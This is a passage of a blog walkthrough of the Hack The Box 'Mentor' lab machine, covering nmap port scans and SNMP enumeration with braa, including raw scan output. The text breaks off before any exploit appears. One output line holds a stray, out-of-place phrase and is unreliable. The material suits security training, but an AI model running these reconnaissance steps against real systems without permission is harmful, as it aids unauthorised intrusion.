@@ -1,0 +1,1160 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Mentor HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Mentor HTB Walkthrough"><meta property="og:description" content="Introduction As you&rsquo;ll see, we get to visit SNMP enumeration (not once, but twice!) and deal with a flaky web server which we fail to enumerate initially. Once the web server is accessible after a well deserved break, we manage to find some APIs to enumerate eventually leading to command injection and a reverse shell.
+It&rsquo;s here we realise we&rsquo;re in a fairly minimal Docker container with not many tools at our disposal."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-03-11-mentor/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-11T00:00:00+11:00"><meta property="article:modified_time" content="2023-03-11T16:02:36+11:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Mentor HTB Walkthrough"><meta name=twitter:description content="Introduction As you&rsquo;ll see, we get to visit SNMP enumeration (not once, but twice!) and deal with a flaky web server which we fail to enumerate initially. Once the web server is accessible after a well deserved break, we manage to find some APIs to enumerate eventually leading to command injection and a reverse shell.
+It&rsquo;s here we realise we&rsquo;re in a fairly minimal Docker container with not many tools at our disposal."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-03-11-mentor/><link rel=prev href=https://emdwyer.github.io/2023-02-25-awkward-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Mentor HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-03-11-mentor\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, ctf, snmp, docker, python","wordcount":5136,"url":"https:\/\/emdwyer.github.io\/2023-03-11-mentor\/","datePublished":"2023-03-11T00:00:00+11:00","dateModified":"2023-03-11T16:02:36+11:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Mentor HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-03-11>2023-03-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;5136 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;25 minutes&nbsp;<span id=/2023-03-11-mentor/ class=leancloud_visitors data-flag-title="Mentor HTB Walkthrough">
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./mentor.png data-srcset="./mentor.png, ./mentor.png 1.5x, ./mentor.png 2x" data-sizes=auto alt=./mentor.png title=Awkward></p><h2 id=introduction>Introduction</h2><p>As you&rsquo;ll see, we get to visit SNMP enumeration (not once, but twice!) and deal with a flaky web server which we fail to enumerate initially. Once the web server is accessible after a well deserved break, we manage to find some APIs to enumerate eventually leading to command injection and a reverse shell.</p><p>It&rsquo;s here we realise we&rsquo;re in a fairly minimal Docker container with not many tools at our disposal. We look through the code of the running Flask app, finding a hard coded PostgreSQL connection string.</p><p>Next, we learn to tunnel Postgres connections through our Docker container using chisel. This lets us gain a foothold on the Docker host where we are able to then privesc to get the root flag.</p><h2 id=enumeration>Enumeration</h2><p>As per usual, we start with an <code>nmap</code> scan to see which common ports/services are accessible:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.193
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-02-12 17:13 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.193
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.023s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu <span class=m>3</span> <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> c73bfc3cf9ceee8b4818d5d1af8ec2bb <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 4440084c0ecbd4f18e7eeda85c68a4f7 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.52
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://mentorquotes.htb/
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.52 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: Host: mentorquotes.htb<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 9.03 seconds
+</span></span></code></pre></td></tr></table></div></div><p>I next added <code>10.10.11.193 mentorquotes.htb</code> to <code>/etc/hosts</code>, but could not navigate to <a href=http://mentorquotes.htb target=_blank rel="noopener noreffer">http://mentorquotes.htb</a></p><p>Running <code>gobuster</code>, which found nothing, it appears once opening port 80, no data is returned whatsoever by the server. It was here I felt a little stuck, but as I found out later, the web server was flaky thanks to people enumerating and hammering it with requests &ndash; which was fixed by a reboot.</p><p>Before I realised how screwy the web server was, I dug deep thinking I was missing <strong>something</strong>, and next ran a UDP scan which showed SNMP running. Simple Network Management Protocol (SNMP) is a network protocol used for monitoring and managing network devices, OSes and basically whatever other device or service may support SNMP. Using <code>nmap</code>, we see SNMP is indeed running on our target, and accessible via the &lsquo;public&rsquo; community string:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sudo</span> nmap -sUV -F 10.10.11.193
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-02-12 17:27 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> mentorquotes.htb <span class=o>(</span>10.10.11.193<span class=o>)</span>
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.020s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>59</span> closed udp ports <span class=o>(</span>port-unreach<span class=o>)</span>, <span class=m>40</span> open<span class=p>|</span>filtered udp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT    STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>161/udp open  snmp    SNMPv1 server<span class=p>;</span> net-snmp SNMPv3 server <span class=o>(</span>public<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: Host: mentor
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 224.00 seconds
+</span></span></code></pre></td></tr></table></div></div><p>SNMP consists of a hierarchical namespace known as a <em>management information base</em> (MIB). The namespace consists of Object IDs (OIDs), each of which is a variable that can either be read (get) or written (set) &ndash; assuming the correct permissions are given, of course.</p><p>The OID notation consist of numbers separated by a dot/period. We can use <a href=https://github.com/mteg/braa target=_blank rel="noopener noreffer">braa</a> to enumerate SNMP &ndash; using the OID prefix <code>1.3.6.1</code>, which is <code>iso.org.dod.internet</code> (common for most devices). This will effectively go through and get each OID one by one, or &lsquo;walk&rsquo; the OID tree, providing us information about the target.</p><p>We assume the community string &lsquo;public&rsquo; here, which is used like a password to access SNMP. Ideally, you should not be using well known default community strings when relying on SNMP. With this in mind, let&rsquo;s enumerate everything under <code>1.3.6.1.*</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-v data-lang=v><span class=line><span class=cl><span class=o>$</span><span class=nv>braa</span> <span class=nv>public</span><span class=o>@</span><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mf>.1.3.6.1</span><span class=p>.</span><span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=nc>Linux</span> <span class=nv>mentor</span> <span class=mf>5.15.0</span><span class=o>-</span><span class=mi>56</span><span class=o>-</span><span class=nv>generic</span> <span class=cp>#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mf>.10</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>30</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>8641015</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>52</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=nc>Me</span> <span class=p>&lt;</span><span class=nv>admin</span><span class=o>@</span><span class=nv>mentorquotes</span><span class=p>.</span><span class=nv>htb</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=nv>mentor</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=nc>Sitting</span> <span class=nv>on</span> <span class=nv>the</span> <span class=nc>Dock</span> <span class=nv>of</span> <span class=nv>the</span> <span class=nc>Bay</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>72</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.1</span><span class=p>:</span><span class=mf>.1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.2</span><span class=p>:</span><span class=mf>.1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>25</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.3</span><span class=p>:</span><span class=mf>.1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.4</span><span class=p>:</span><span class=mf>.1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.5</span><span class=p>:</span><span class=mf>.1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.6</span><span class=p>:</span><span class=mf>.49</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.7</span><span class=p>:</span><span class=mf>.50</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>26</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.8</span><span class=p>:</span><span class=mf>.4</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>26</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.9</span><span class=p>:</span><span class=mf>.3</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>25</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.10</span><span class=p>:</span><span class=mf>.92</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.1</span><span class=p>:</span><span class=nc>The</span> <span class=nc>SNMP</span> <span class=nc>Management</span> <span class=nc>Architecture</span> <span class=nc>MIB</span><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.2</span><span class=p>:</span><span class=nc>The</span> <span class=nc>MIB</span> <span class=k>for</span> <span class=nc>Message</span> <span class=nc>Processing</span> <span class=nv>and</span> <span class=nc>Dispatching</span><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.3</span><span class=p>:</span><span class=nc>The</span> <span class=nv>management</span> <span class=nv>information</span> <span class=nv>definitions</span> <span class=k>for</span> <span class=nv>the</span> <span class=nc>SNMP</span> <span class=nc>User</span><span class=o>-</span><span class=nv>based</span> <span class=nc>Security</span> <span class=nc>Model</span><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.4</span><span class=p>:</span><span class=nc>The</span> <span class=nc>MIB</span> <span class=kn>module</span> <span class=k>for</span> <span class=nc>SNMPv2</span> <span class=nv>entities</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.5</span><span class=p>:</span><span class=nc>View</span><span class=o>-</span><span class=nv>based</span> <span class=nc>Access</span> <span class=nc>Control</span> <span class=nc>Model</span> <span class=k>for</span> <span class=nc>SNMP</span><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.6</span><span class=p>:</span><span class=nc>The</span> <span class=nc>MIB</span> <span class=kn>module</span> <span class=k>for</span> <span class=nv>managing</span> <span class=nc>TCP</span> <span class=nv>implementations</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>23</span><span class=nv>ms</span> <span class=nv>privileges</span> <span class=nv>with</span> <span class=kd>enum</span> <span class=nv>data</span><span class=p>,</span> <span class=nv>the</span> <span class=nv>rest</span> <span class=k>is</span> <span class=nv>a</span> <span class=nv>matter</span> <span class=p>:</span><span class=mf>.7</span><span class=p>:</span><span class=nc>The</span> <span class=nc>MIB</span> <span class=kn>module</span> <span class=k>for</span> <span class=nv>managing</span> <span class=nc>UDP</span> <span class=nv>implementations</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>22</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.8</span><span class=p>:</span><span class=nc>The</span> <span class=nc>MIB</span> <span class=kn>module</span> <span class=k>for</span> <span class=nv>managing</span> <span class=nc>IP</span> <span class=nv>and</span> <span class=nc>ICMP</span> <span class=nv>implementations</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.9</span><span class=p>:</span><span class=nc>The</span> <span class=nc>MIB</span> <span class=nv>modules</span> <span class=k>for</span> <span class=nv>managing</span> <span class=nc>SNMP</span> <span class=nc>Notification</span><span class=p>,</span> <span class=nv>plus</span> <span class=nv>filtering</span><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.10</span><span class=p>:</span><span class=nc>The</span> <span class=nc>MIB</span> <span class=kn>module</span> <span class=k>for</span> <span class=nv>logging</span> <span class=nc>SNMP</span> <span class=nc>Notifications</span><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.1</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>22</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.2</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.3</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>49</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.4</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.5</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.6</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>21</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.7</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>41</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.8</span><span class=p>:</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.9</span><span class=p>:</span><span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.10</span><span class=p>:</span><span class=mi>2</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>42</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>8644480</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>41</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=err>�</span> 
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>44</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>393216</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>54</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=nc>BOOT_IMAGE</span><span class=o>=/</span><span class=nv>vmlinuz</span><span class=o>-</span><span class=mf>5.15.0</span><span class=o>-</span><span class=mi>56</span><span class=o>-</span><span class=nv>generic</span> <span class=nv>root</span><span class=o>=/</span><span class=nv>dev</span><span class=o>/</span><span class=nv>mapper</span><span class=o>/</span><span class=nv>ubuntu</span><span class=o>--</span><span class=nv>vg</span><span class=o>-</span><span class=nv>ubuntu</span><span class=o>--</span><span class=nv>lv</span> <span class=nv>ro</span> <span class=nv>net</span><span class=p>.</span><span class=nv>ifnames</span><span class=o>=</span><span class=mi>0</span> <span class=nv>biosdevname</span><span class=o>=</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>45</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>66</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>228</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=mf>10.10.11.193</span><span class=p>:</span><span class=mi>20</span><span class=nv>ms</span><span class=p>:</span><span class=mf>.0</span><span class=p>:</span><span class=nb>Error</span> <span class=p>[</span><span class=err>2</span><span class=p>]</span> <span class=nc>No</span> <span class=nv>such</span> <span class=nv>name</span><span class=p>.</span>
